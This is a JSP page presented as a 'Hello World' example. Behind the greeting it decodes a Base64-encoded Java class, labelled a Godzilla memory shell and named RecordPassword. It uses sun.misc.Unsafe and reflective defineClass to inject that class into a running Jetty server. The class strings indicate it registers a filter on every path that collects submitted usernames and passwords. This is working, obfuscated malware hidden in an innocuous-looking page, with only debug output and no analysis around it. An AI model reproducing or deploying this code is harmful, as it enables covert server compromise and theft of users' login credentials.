<%@ page import="com.sun.tools.javac.Main" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64" %>
<html>
<head><title>Hello World</title></head>
<body>
Hello World!<br/>
<%
try{
    out.println("bbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    String godzillaMemShellClassBase64 = "yv66vgAAAD0BhAoAAgADBwAEDAAFAAYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgoAAgAIDAAFAAkBAAMoKVYKAAsADAcADQwADgAPAQAOUmVjb3JkUGFzc3dvcmQBAAlhZGRGaWx0ZXIBACgoTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyOylaBwARAQATamF2YS9sYW5nL1Rocm93YWJsZQcAEwEAE2phdmEvdXRpbC9BcnJheUxpc3QKABIACAoAFgAXBwAYDAAZABoBABBqYXZhL2xhbmcvT2JqZWN0AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CgAcAB0HAB4MAB8AIAEAD2phdmEvbGFuZy9DbGFzcwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwoAEgAiDAAjACQBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoKACYAJwcAKAwAKQAqAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAJgAsDAAtACABABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIKACYALwwAMAAxAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7CgAzADQHADUMADYANwEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAEAC2FjdGl2ZUNvdW50AQADKClJCgAzADkMADoAOwEACWVudW1lcmF0ZQEAFihbTGphdmEvbGFuZy9UaHJlYWQ7KUkHAD0BABNqYXZhL2xhbmcvRXhjZXB0aW9uCgASAD8MAEAANwEABHNpemUKABIAQgwAQwBEAQADZ2V0AQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7CgAcAEYMAEcASAEAB2Zvck5hbWUBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7CgAcAEoMAEcASwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsHAE0BABFqYXZhL3V0aWwvSGFzaFNldAoATAAICgAcAFAMAFEAUgEAEWdldERlY2xhcmVkRmllbGRzAQAcKClbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAVABVBwBWDABXAFgBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgBUAFoMAEMAWwEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CgBMACIKABwAXgwAXwAaAQANZ2V0U3VwZXJjbGFzcwoACwBhDABiAGMBAA9nZXRPYmplY3RWYWx1ZXMBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9DbGFzczspW0xqYXZhL2xhbmcvT2JqZWN0OwoATABlDABmAGcBAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7CgBMAGkMAGoAJAEACGNvbnRhaW5zCgAcAGwMAG0AJAEACmlzSW5zdGFuY2UKAAsAbwwAcABxAQAKZ2V0SGFuZGxlcwEAOShMamF2YS91dGlsL0hhc2hTZXQ7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9DbGFzczspVggAcwEAC2dldEhhbmRsZXJzCgALAHUMAHYAdwEADGludm9rZU1ldGhvZAEASyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwcAeQEAFGphdmEvdXRpbC9Db2xsZWN0aW9uCwB4AGUKABwAfAwAfQB+AQAHaXNBcnJheQEAAygpWgoAgACBBwCCDACDAIQBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQEACWdldExlbmd0aAEAFShMamF2YS9sYW5nL09iamVjdDspSQoAgACGDABDAIcBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsIAIkBAC9vcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuaGFuZGxlci5Db250ZXh0SGFuZGxlcgoACwCLDACMAEsBAAtsb2FkQ2xhc3NlcwgAjgEAEWdldEN1cnJlbnRDb250ZXh0CgALAJAMAJEAkgEAEGdldE1ldGhvZEJ5Q2xhc3MBAFEoTGphdmEvbGFuZy9DbGFzcztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKAJQAlQcAlgwAlwCYAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CACaAQARZ2V0Q29udGV4dEhhbmRsZXIIAJwBAAlnZXRTZXJ2ZXIIAJ4BACBvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuSGFuZGxlcgoAAgCgDAChAEsBAAlsb2FkQ2xhc3MKACYANAoAJgA5CgALAKUMAHAAZwgApwEACF9maWx0ZXJzCgALAKkMAKoAqwEACGdldEZpZWxkAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CACtAQAPX2ZpbHRlck1hcHBpbmdzCgBUAK8MALAAGgEAB2dldFR5cGUKABwAsgwAswAaAQAQZ2V0Q29tcG9uZW50VHlwZQoAVAC1DAC2ALcBAA5nZXRHZW5lcmljVHlwZQEAGigpTGphdmEvbGFuZy9yZWZsZWN0L1R5cGU7BwC5AQAjamF2YS9sYW5nL3JlZmxlY3QvUGFyYW1ldGVyaXplZFR5cGULALgAuwwAvAC9AQAWZ2V0QWN0dWFsVHlwZUFyZ3VtZW50cwEAGygpW0xqYXZhL2xhbmcvcmVmbGVjdC9UeXBlOwgAvwEAFmpha2FydGEuc2VydmxldC5GaWx0ZXIKABwAwQwAwgDDAQAOZ2V0Q29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsIAMUBABRqYXZheC5zZXJ2bGV0LkZpbHRlcgcAxwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uCgDJAMoHAMsMAMwAzQEAF2phdmEvbGFuZy9yZWZsZWN0L1Byb3h5AQAQbmV3UHJveHlJbnN0YW5jZQEAYihMamF2YS9sYW5nL0NsYXNzTG9hZGVyO1tMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjspTGphdmEvbGFuZy9PYmplY3Q7CgDPANAHANEMANIA0wEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABwA1QwA0gDWAQAUKClMamF2YS9sYW5nL09iamVjdDsIANgBAA9zZXRGaWx0ZXJIb2xkZXIKABwA2gwA2wDcAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7CgCUAFUIAN8BAAxzZXRQYXRoU3BlY3MHAOEBABNbTGphdmEvbGFuZy9TdHJpbmc7CgAcAOMMAOQA3AEACWdldE1ldGhvZAcA5gEAEGphdmEvbGFuZy9TdHJpbmcIAOgBAAIvKggADggA6wEAFHByZXBlbmRGaWx0ZXJNYXBwaW5nCgCUAO0MAO4A7wEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgA8QEACGRvRmlsdGVyCgDlAPMMAPQAJAEABmVxdWFscwoACwD2DAD3APgBAANydW4BACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVoKAJQA+gwA+wD8AQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwoAEgD+DABmAP8BACgoW0xqYXZhL2xhbmcvT2JqZWN0OylbTGphdmEvbGFuZy9PYmplY3Q7BwEBAQASW0xqYXZhL2xhbmcvQ2xhc3M7CgAcAQMMAQQBBQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsIAQcBAAxnZXRQYXJhbWV0ZXIIAQkBAAh1c2VybmFtZQoACwELDAEHAQwBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwgBDgEACHBhc3N3b3JkCQALARAMAREBEgEACHVzZXJpbmZvAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7EgAAARQMARUBFgEAF21ha2VDb25jYXRXaXRoQ29uc3RhbnRzAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsKAAsACAoACwEZDAAOAAkHARsBACNqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAQTFJlY29yZFBhc3N3b3JkOwEABmxvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQANU3RhY2tNYXBUYWJsZQEAAWkBAAFJAQALdGhyZWFkR3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAC3RocmVhZENvdW50AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAAljbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAAxjbGFzc0xvYWRlcnMBAAdsb2FkZXJzBwEqAQAKRXhjZXB0aW9ucwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABm9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmZpZWxkcwEAGltMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQADb2JqAQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABnZhbHVlcwEAE0xqYXZhL3V0aWwvSGFzaFNldDsHATYBAApoYW5kbGVTaXplAQAHaGFuZGxlcwEABmhhbmRsZQEADGhhbmRsZXJDbGFzcwEAB29iamVjdHMBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAPbmV3SGFuZGxlT2JqZWN0BwFCAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQATY29udGV4dEhhbmRsZXJDbGFzcwEAF2dldEN1cnJlbnRDb250ZXh0TWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAdjb250ZXh0AQANd2ViQXBwQ29udGV4dAEAC2pldHR5U2VydmVyAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADV9maWx0ZXJzRmllbGQBABRfZmlsdGVyTWFwcGluZ3NGaWVsZAEAEWZpbHRlckhvbGRlckNsYXNzAQASZmlsdGVyTWFwcGluZ0NsYXNzAQAZc2VydmxldFJlcXVlc3RGaWx0ZXJDbGFzcwEAF2ZpbHRlckhvbGRlckNvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEABmZpbHRlcgEADGZpbHRlckhvbGRlcgEADWZpbHRlck1hcHBpbmcBABVzZXRGaWx0ZXJIb2xkZXJNZXRob2QBAA1oYW5kbGVyT2JqZWN0AQAXZmlsdGVySW52b2NhdGlvbkhhbmRsZXIBACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7AQAEaXNPawEAAVoBAFMoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADHJlcXVlc3RDbGFzcwEADXJlc3BvbnNlQ2xhc3MBAA5zZXJ2bGV0UmVxdWVzdAEAD3NlcnZsZXRSZXNwb25zZQEAC2ZpbHRlckNoYWluAQAFcHJveHkBAAZtZXRob2QBAARhcmdzAQACbzEBAAdjbGFzc2VzAQAKbWV0aG9kTmFtZQEACnBhcmFtZXRlcnMBAAJjcwEACWZpZWxkTmFtZQEADXJlcXVlc3RPYmplY3QBAARuYW1lAQAHcmVxdWVzdAEACHJlc3BvbnNlAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQATUmVjb3JkUGFzc3dvcmQuamF2YQEAEEJvb3RzdHJhcE1ldGhvZHMPBgF3CgF4AXkHAXoMARUBewEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBl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";
    byte[] bytes = Base64.getDecoder().decode(godzillaMemShellClassBase64);
    Class unsafeClass = Class.forName("sun.misc.Unsafe");
    Field field = unsafeClass.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    Unsafe unsafe = (Unsafe) field.get(null);
    Module baseModule = Object.class.getModule();
    Class currentClass = Main.class;
    long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
    out.println("ccccccccccccccccccc");
    unsafe.putObject(currentClass, offset, baseModule);
    out.println("ddddddddd");
    Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    out.println("eeeeee");
    method.setAccessible(true);
    out.println("ffffffff");
    ((Class)method.invoke(ClassLoader.getSystemClassLoader(), "RecordPassword", bytes, 0, bytes.length)).newInstance();
    out.println("ggggggggggggggg");
}catch (Exception e){

    out.println("aaaaaaaaaaaaaaaaaaa");
}

%>
</body>
</html>